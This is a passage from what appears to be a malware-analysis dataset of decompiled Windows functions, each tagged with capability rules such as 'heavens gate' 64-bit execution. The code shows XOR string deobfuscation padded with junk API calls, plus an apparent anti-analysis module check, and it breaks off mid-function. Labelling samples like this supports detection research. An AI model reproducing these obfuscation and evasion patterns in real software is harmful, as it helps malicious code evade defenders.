iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x11);\n    fcn.0040468d();\n    var_14h._0_1_ = 0x1f;\n    var_14h._1_1_ = 0x3c;\n    var_14h._2_1_ = 4;\n    var_14h._3_1_ = 0xc;\n    var_10h._0_1_ = 0x23;\n    var_10h._1_1_ = 0x25;\n    var_10h._2_1_ = 0x38;\n    var_10h._3_1_ = 9;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 0x10;\n    var_ch._2_1_ = 0x31;\n    var_ch._3_1_ = 0x25;\n    var_8h._0_1_ = 0x20;\n    var_8h._1_1_ = 0x3c;\n    var_8h._2_1_ = 0x22;\n    var_8h._3_1_ = 0x1c;\n    var_4h._0_1_ = 0x47;\n    var_dch = 0x7945594c;\n    var_d8h._0_2_ = 0x4c47;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x12);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_e4h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0xc308f3) {\n            *(iVar5 + iVar7) = *(&var_dch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x11);\n    fcn.0040468d();\n    var_20h = 0x13611325;\n    var_1ch = 0x1e23;\n    var_1ah = 0x13;\n    var_19h = 0x1b;\n    var_18h._0_1_ = 0x77;\n    var_18h._1_1_ = 4;\n    var_18h._2_1_ = 0x26;\n    var_18h._3_1_ = 3;\n    var_14h._0_1_ = 4;\n    var_14h._1_1_ = 0x19;\n    var_14h._2_1_ = 0x5c;\n    var_14h._3_1_ = 7;\n    var_10h._0_1_ = 0x35;\n    var_10h._1_1_ = 4;\n    var_10h._2_1_ = 2;\n    var_10h._3_1_ = 0x26;\n    var_ch._0_1_ = 0x40;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x26;\n    var_ch._3_1_ = 3;\n    var_8h._0_1_ = 0x1a;\n    var_8h._1_1_ = 0x13;\n    var_8h._2_1_ = 0x55;\n    var_8h._3_1_ = 0xf;\n    var_4h._0_1_ = 0x50;\n    var_d4h = 0x6a327676;\n    var_d0h._0_2_ = 0x6a50;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1e);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_dch = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n        if (iVar6 != 0xa3b718) {\n            *(iVar5 + iVar7) = *(&var_d4h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1d);\n    fcn.0040468d();\n    var_18h._0_1_ = 0x39;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x39;\n    var_18h._3_1_ = 0xe;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 0x23;\n    var_14h._2_1_ = 0xd;\n    var_14h._3_1_ = 0x17;\n    var_10h._0_1_ = 0x34;\n    var_10h._1_1_ = 9;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0xc;\n    var_ch._1_1_ = 0xb;\n    var_ch._2_1_ = 0x2a;\n    var_ch._3_1_ = 0x14;\n    var_8h._0_1_ = 0x13;\n    var_8h._1_1_ = 0x3b;\n    var_8h._2_1_ = 3;\n    var_8h._3_1_ = 0x1e;\n    var_4h._0_1_ = 0x1f;\n    var_4h._1_1_ = 1;\n    var_4h._2_1_ = 0x1f;\n    var_4h._3_1_ = 0x4d;\n    var_cch = 0x667a726a;\n    var_c8h._0_2_ = 0x4d7a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_d4h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetFocus)();\n        if (iVar6 != 0x8012b6) {\n            *(iVar5 + iVar7) = *(&var_cch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.0040468d();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_1ch = 0x2714;\n    var_1ah = 0x3b;\n    var_19h = 0x12;\n    var_18h._0_1_ = 0x3d;\n    var_18h._1_1_ = 0x28;\n    var_18h._2_1_ = 0x36;\n    var_18h._3_1_ = 0xc;\n    var_14h._0_1_ = 0x24;\n    var_14h._1_1_ = 0x38;\n    var_14h._2_1_ = 0x32;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0xd;\n    var_10h._1_1_ = 0x18;\n    var_10h._2_1_ = 0x27;\n    var_10h._3_1_ = 0x29;\n    var_ch._0_1_ = 0x12;\n    var_ch._1_1_ = 0x1b;\n    var_ch._2_1_ = 0x1e;\n    var_ch._3_1_ = 0x26;\n    var_8h._0_1_ = 0x2e;\n    var_8h._1_1_ = 0x2e;\n    var_8h._2_1_ = 0xc;\n    var_8h._3_1_ = 0x10;\n    var_4h._0_1_ = 0x35;\n    var_4h._1_1_ = 0x47;\n    var_84h = 0x77694247;\n    var_80h._0_1_ = 0x50;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1b);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_1ch - iVar7;\n    var_cch = iVar7;\n    do {\n        iVar6 = (*pcVar1)();\n        if (iVar6 != 0x644848) {\n            *(iVar5 + iVar7) = *(&var_84h + iVar5 % var_34h) ^ (iVar5 + iVar7)[var_24h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1a);\n    fcn.0040468d();\n    var_14h._0_1_ = 0x3c;\n    var_14h._1_1_ = 8;\n    var_14h._2_1_ = 0x1d;\n    var_14h._3_1_ = 0x36;\n    var_10h._0_1_ = 0xf;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x23;\n    var_ch._0_1_ = 8;\n    var_ch._1_1_ = 0x19;\n    var_ch._2_1_ = 6;\n    var_ch._3_1_ = 0x1b;\n    var_8h._0_1_ = 0x21;\n    var_8h._1_1_ = 0x34;\n    var_8h._2_1_ = 0xe;\n    var_8h._3_1_ = 8;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x48;\n    var_7ch = 0x58486d6f;\n    var_78h._0_1_ = 0x6b;\n    uVar3 = (*pcVar1)(8, 0x13);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_84h = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetDoubleClickTime)();\n        if (iVar6 != 0x8d67b1) {\n            *(iVar5 + iVar7) = *(&var_7ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x12);\n    fcn.0040468d();\n    var_18h._0_1_ = 0xb;\n    var_18h._1_1_ = 0x1d;\n    var_18h._2_1_ = 0x2a;\n    var_18h._3_1_ = 0x17;\n    var_14h._0_1_ = 0x5e;\n    var_14h._1_1_ = 0x3b;\n    var_14h._2_1_ = 0x39;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0xb;\n    var_10h._1_1_ = 0x5e;\n    var_10h._2_1_ = 0x2c;\n    var_10h._3_1_ = 0x28;\n    var_ch._0_1_ = 0xb;\n    var_ch._1_1_ = 7;\n    var_ch._2_1_ = 0x46;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 0x14;\n    var_8h._1_1_ = 0x1c;\n    var_8h._2_1_ = 9;\n    var_8h._3_1_ = 0x55;\n    var_4h._0_1_ = 0x58;\n    var_74h = 0x6e797858;\n    var_70h._0_1_ = 0x30;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x16);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_7ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CountClipboardFormats)();\n        if (iVar6 != 0xf666f3) {\n            *(iVar5 + iVar7) = *(&var_74h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x15);\n    fcn.0040468d();\n    var_1ch = 0x2124;\n    var_1ah = 0;\n    var_19h = 0x29;\n    var_18h._0_1_ = 0x1b;\n    var_18h._1_1_ = 0x15;\n    var_18h._2_1_ = 0x28;\n    var_18h._3_1_ = 0x20;\n    var_14h._0_1_ = 3;\n    var_14h._1_1_ = 0x1f;\n    var_14h._2_1_ = 0x1b;\n    var_14h._3_1_ = 0x21;\n    var_10h._0_1_ = 0x22;\n    var_10h._1_1_ = 0x26;\n    var_10h._2_1_ = 0xe;\n    var_10h._3_1_ = 0x1e;\n    var_ch._0_1_ = 0x2b;\n    var_ch._1_1_ = 0x2b;\n    var_ch._2_1_ = 0x17;\n    var_ch._3_1_ = 8;\n    var_8h._0_1_ = 0x1e;\n    var_8h._1_1_ = 0x32;\n    var_8h._2_1_ = 0x2c;\n    var_8h._3_1_ = 0x2b;\n    var_4h._0_1_ = 0x1f;\n    var_4h._1_1_ = 0x10;\n    var_4h._2_1_ = 0x21;\n    var_4h._3_1_ = 0x45;\n    var_6ch = 0x47454477;\n    var_68h._0_1_ = 0x7a;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_74h = iVar7;\n    var_24h = &var_1ch - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar6 != 0x843362) {\n            *(iVar5 + iVar7) = *(&var_6ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_1ch - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1c);\n    fcn.0040468d();\n    var_18h._0_1_ = 9;\n    var_18h._1_1_ = 3;\n    var_18h._2_1_ = 0x3d;\n    var_18h._3_1_ = 0x32;\n    var_14h._0_1_ = 0x2f;\n    var_14h._1_1_ = 0x52;\n    var_14h._2_1_ = 0x3d;\n    var_14h._3_1_ = 3;\n    var_10h._0_1_ = 0x26;\n    var_10h._1_1_ = 0x3c;\n    var_10h._2_1_ = 0x2d;\n    var_10h._3_1_ = 0x46;\n    var_ch._0_1_ = 0x37;\n    var_ch._1_1_ = 3;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 0x28;\n    var_8h._1_1_ = 0x45;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 10;\n    var_4h._0_1_ = 0x15;\n    var_4h._1_1_ = 0x34;\n    var_4h._2_1_ = 0x24;\n    var_4h._3_1_ = 0x33;\n    var_c4h = 0x5370665a;\n    var_c0h._0_2_ = 0x3341;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_6ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_DestroyCaret)();\n        if (iVar6 != 0xc6757f) {\n            *(iVar5 + iVar7) = *(&var_c4h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.0040468d();\n    var_18h._0_1_ = 0x6b;\n    var_18h._1_1_ = 0x11;\n    var_18h._2_1_ = 0x3a;\n    var_18h._3_1_ = 0;\n    var_14h._0_1_ = 8;\n    var_14h._1_1_ = 0x5d;\n    var_14h._2_1_ = 6;\n    var_14h._3_1_ = 0;\n    var_10h._0_1_ = 2;\n    var_10h._1_1_ = 0x16;\n    var_10h._2_1_ = 0x59;\n    var_10h._3_1_ = 0;\n    var_ch._0_1_ = 0x16;\n    var_ch._1_1_ = 0x3d;\n    var_ch._2_1_ = 10;\n    var_ch._3_1_ = 0x51;\n    var_8h._0_1_ = 2;\n    var_8h._1_1_ = 0x1a;\n    var_8h._2_1_ = 1;\n    var_8h._3_1_ = 0x1d;\n    var_4h._0_1_ = 0x5f;\n    var_4h._1_1_ = 0x11;\n    var_4h._2_1_ = 0x73;\n    var_5ch = 0x6d737438;\n    var_58h._0_1_ = 0x78;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x18);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_c4h = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardViewer)();\n        if (iVar6 != 0x8af0fc) {\n            *(iVar5 + iVar7) = *(&var_5ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x17);\n    fcn.0040468d();\n    var_18h._0_1_ = 0;\n    var_18h._1_1_ = 0x1c;\n    var_18h._2_1_ = 0x24;\n    var_18h._3_1_ = 0xb;\n    var_14h._0_1_ = 0x1d;\n    var_14h._1_1_ = 0x32;\n    var_14h._2_1_ = 0xd;\n    var_14h._3_1_ = 2;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x14;\n    var_10h._2_1_ = 0x3c;\n    var_10h._3_1_ = 0x1b;\n    var_ch._0_1_ = 6;\n    var_ch._1_1_ = 0x15;\n    var_ch._2_1_ = 0x28;\n    var_ch._3_1_ = 0x21;\n    var_8h._0_1_ = 0x10;\n    var_8h._1_1_ = 0x11;\n    var_8h._2_1_ = 0x10;\n    var_8h._3_1_ = 0x14;\n    var_4h._0_1_ = 0x36;\n    var_4h._1_1_ = 0x1e;\n    var_4h._2_1_ = 2;\n    var_4h._3_1_ = 0x79;\n    var_54h = 0x79677953;\n    var_50h._0_1_ = 0x78;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x19);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_5ch = iVar7;\n    var_24h = &var_18h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_CloseClipboard)();\n        if (iVar6 != 0xde26a9) {\n            *(iVar5 + iVar7) = *(&var_54h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_18h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x18);\n    fcn.0040468d();\n    var_20h = 0x35043f23;\n    var_1ch = 0x318;\n    var_1ah = 0x2e;\n    var_19h = 0x35;\n    var_18h._0_1_ = 0x23;\n    var_18h._1_1_ = 0x2e;\n    var_18h._2_1_ = 2;\n    var_18h._3_1_ = 0x3f;\n    var_14h._0_1_ = 0x34;\n    var_14h._1_1_ = 10;\n    var_14h._2_1_ = 0xc;\n    var_14h._3_1_ = 0x1e;\n    var_10h._0_1_ = 0x1b;\n    var_10h._1_1_ = 0x33;\n    var_10h._2_1_ = 0x24;\n    var_10h._3_1_ = 8;\n    var_ch._0_1_ = 3;\n    var_ch._1_1_ = 0x29;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x35;\n    var_8h._0_1_ = 4;\n    var_8h._1_1_ = 6;\n    var_8h._2_1_ = 0x33;\n    var_8h._3_1_ = 0x3c;\n    var_4h._0_1_ = 0x22;\n    var_4h._1_1_ = 10;\n    var_4h._2_1_ = 0x15;\n    var_4h._3_1_ = 0x5a;\n    var_4ch = 0x47505a70;\n    var_48h._0_1_ = 0x6d;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x21);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_54h = iVar7;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar6 != 0xafd369) {\n            *(iVar5 + iVar7) = *(&var_4ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x20);\n    fcn.0040468d();\n    var_14h._0_1_ = 0x27;\n    var_14h._1_1_ = 0x20;\n    var_14h._2_1_ = 0x62;\n    var_14h._3_1_ = 0x34;\n    var_10h._0_1_ = 0x3e;\n    var_10h._1_1_ = 0x1b;\n    var_10h._2_1_ = 0x16;\n    var_10h._3_1_ = 0x20;\n    var_ch._0_1_ = 0x5c;\n    var_ch._1_1_ = 1;\n    var_ch._2_1_ = 0x20;\n    var_ch._3_1_ = 0x13;\n    var_8h._0_1_ = 2;\n    var_8h._1_1_ = 0x2c;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0x34;\n    var_4h._0_1_ = 0x35;\n    var_4h._1_1_ = 0x1f;\n    var_4h._2_1_ = 0x74;\n    var_bch = 0x51304574;\n    var_b8h._0_2_ = 0x7a52;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x14);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_4ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n        if (iVar6 != 0xf22521) {\n            *(iVar5 + iVar7) = *(&var_bch + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x13);\n    fcn.0040468d();\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    var_20h = 0x3202337;\n    var_1ch = 0x1654;\n    var_1ah = 0x23;\n    var_19h = 8;\n    var_18h._0_1_ = 0x1e;\n    var_18h._1_1_ = 0x52;\n    var_18h._2_1_ = 0x33;\n    var_18h._3_1_ = 0x29;\n    var_14h._0_1_ = 0x1b;\n    var_14h._1_1_ = 6;\n    var_14h._2_1_ = 0x5e;\n    var_14h._3_1_ = 10;\n    var_10h._0_1_ = 0x21;\n    var_10h._1_1_ = 0x3a;\n    var_10h._2_1_ = 8;\n    var_10h._3_1_ = 0x43;\n    var_ch._0_1_ = 0x34;\n    var_ch._1_1_ = 0x34;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x1b;\n    var_8h._0_1_ = 0x5e;\n    var_8h._1_1_ = 8;\n    var_8h._2_1_ = 0x23;\n    var_8h._3_1_ = 0xe;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x37;\n    var_3ch = 0x6d694664;\n    var_38h._0_1_ = 0x37;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_20h - iVar7;\n    var_bch = iVar7;\n    do {\n        iVar6 = (*pcVar1)();\n        if (iVar6 != 0x4ccf2c) {\n            *(iVar5 + iVar7) = *(&var_3ch + iVar5 % var_34h) ^ (iVar5 + iVar7)[var_24h];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040468d();\n    var_14h._0_1_ = 0x36;\n    var_14h._1_1_ = 0x2e;\n    var_14h._2_1_ = 0x3a;\n    var_14h._3_1_ = 0x2f;\n    var_10h._0_1_ = 0x1f;\n    var_10h._1_1_ = 0x34;\n    var_10h._2_1_ = 0x3f;\n    var_10h._3_1_ = 0x24;\n    var_ch._0_1_ = 0;\n    var_ch._1_1_ = 0x23;\n    var_ch._2_1_ = 0x22;\n    var_ch._3_1_ = 0x23;\n    var_8h._0_1_ = 0xc;\n    var_8h._1_1_ = 0x3d;\n    var_8h._2_1_ = 7;\n    var_8h._3_1_ = 0x2a;\n    var_4h._0_1_ = 0x17;\n    var_4h._1_1_ = 0x36;\n    var_4h._2_1_ = 0;\n    var_4h._3_1_ = 0x4b;\n    var_144h = 0x466e4b65;\n    var_140h._0_2_ = 0x5172;\n    uVar3 = (*pcVar1)(8, 0x15);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_3ch = iVar7;\n    var_24h = &var_14h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetClipboardSequenceNumber)();\n        if (iVar6 != 0xf89ddb) {\n            *(iVar5 + iVar7) = *(&var_144h + iVar5 % var_30h) ^ (iVar5 + iVar7)[&var_14h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x14);\n    fcn.0040468d();\n    var_14h._0_1_ = 6;\n    var_20h = 0x352a5c22;\n    var_1ch = 0x100b;\n    var_1ah = 0x4d;\n    var_19h = 0xc;\n    var_18h._0_1_ = 0x14;\n    var_18h._1_1_ = 0x17;\n    var_18h._2_1_ = 0x1c;\n    var_18h._3_1_ = 0x5b;\n    var_14h._1_1_ = 0x2b;\n    var_14h._2_1_ = 7;\n    var_14h._3_1_ = 0x12;\n    var_10h._0_1_ = 0x75;\n    var_10h._1_1_ = 0;\n    var_10h._2_1_ = 0x29;\n    var_10h._3_1_ = 5;\n    var_ch._0_1_ = 0x21;\n    var_ch._1_1_ = 0x4b;\n    var_ch._2_1_ = 0;\n    var_ch._3_1_ = 0x31;\n    var_8h._0_1_ = 7;\n    var_8h._1_1_ = 0x1d;\n    var_8h._2_1_ = 0x5c;\n    var_8h._3_1_ = 0xe;\n    var_4h._0_1_ = 0x22;\n    var_4h._1_1_ = 0x6e;\n    var_30h = 0x47693971;\n    var_2ch._0_1_ = 0x6e;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1f);\n    iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar3);\n    iVar5 = 0;\n    var_24h = &var_20h - iVar7;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar6 != 0xc4f52f) {\n            *(iVar5 + iVar7) = *(&var_30h + iVar5 % var_34h) ^ (iVar5 + iVar7)[&var_20h - iVar7];\n        }\n        iVar5 = iVar5 + 1;\n    } while (iVar5 < 0x1e);\n    fcn.0040468d();\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar3 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar7);\n    pcVar1 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar3);\n    uVar3 = (*pcVar2)(0, var_3ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_bch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_4ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_54h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_5ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_c4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_6ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_74h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_7ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_84h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_cch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_d4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_dch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_e4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_ach);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_b4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_a4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_44h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_124h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_13ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_64h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_12ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_8ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_ech);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_f4h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_fch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_104h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_10ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_114h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_11ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_94h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_9ch);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, var_134h);\n    (*pcVar1)(uVar3);\n    uVar3 = (*pcVar2)(0, iVar4);\n    (*pcVar1)(uVar3);\n    return;\n}\n",
        "token_count": 21332
    },
    "0040a98b": {
        "rules": [
            "64-bit execution via heavens gate/cf627f8086064c53962fc93043360d1e"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.0040a98b(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    char cVar3;\n    int32_t iVar4;\n    uint uVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    uint8_t *extraout_ECX;\n    uint8_t *extraout_ECX_00;\n    uint8_t *extraout_ECX_01;\n    uint8_t *puVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint pcbBuffer;\n    int32_t var_a0h;\n    int32_t var_9ch;\n    int32_t var_98h;\n    int32_t var_94h;\n    int32_t var_90h;\n    int32_t var_8ch;\n    int32_t var_88h;\n    uint var_84h;\n    int32_t var_80h;\n    uint var_7ch;\n    int32_t var_78h;\n    int32_t var_74h;\n    uint var_70h;\n    int32_t var_6ch;\n    uint var_68h;\n    int32_t var_64h;\n    uint var_60h;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_54h;\n    int32_t var_50h;\n    int32_t var_4ch;\n    uint var_48h;\n    int32_t var_44h;\n    int32_t var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    ushort var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    iVar4 = fcn.0040a7d8();\n    if (iVar4 != 0) {\n        fcn.0040a973();\n    }\n    var_20h._0_1_ = 0x11;\n    var_20h._1_1_ = 0x27;\n    var_20h._2_1_ = 0x3f;\n    var_20h._3_1_ = 0x1f;\n    var_1ch._0_1_ = 0x2c;\n    var_1ch._1_1_ = 0x19;\n    var_1ch._2_2_ = 0x7635;\n    var_18h._0_1_ = 0x13;\n    var_18h._1_1_ = 0x25;\n    var_18h._2_1_ = 0x19;\n    var_18h._3_1_ = 0x45;\n    var_74h = 0x77584575;\n    var_70h._0_1_ = 0x49;\n    uVar5 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    iVar4 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar5);\n    var_50h = 5;\n    iVar13 = 0;\n    var_40h = &var_20h - iVar4;\n    do {\n        iVar6 = (*_sym.imp.USER32.dll_GetCapture)();\n        if (iVar6 != 0x224397) {\n            *(iVar13 + iVar4) = *(&var_74h + iVar13 % var_50h) ^ (iVar13 + iVar4)[&var_20h - iVar4];\n        }\n        iVar13 = iVar13 + 1;\n    } while (iVar13 < 0xc);\n    iVar13 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(iVar4);\n    pcVar2 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar13 != 0) {\n        fcn.0040a973();\n    }\n    var_20h._0_1_ = 0x29;\n    var_20h._1_1_ = 0xc;\n    var_20h._2_1_ = 0xc;\n    var_20h._3_1_ = 0x55;\n    var_1ch._0_1_ = 0x5c;\n    var_1ch._1_1_ = 0x28;\n    var_1ch._2_2_ = 0x4036;\n    var_18h._0_1_ = 1;\n    var_18h._1_1_ = 0x5c;\n    var_18h._2_1_ = 0x54;\n    var_18h._3_1_ = 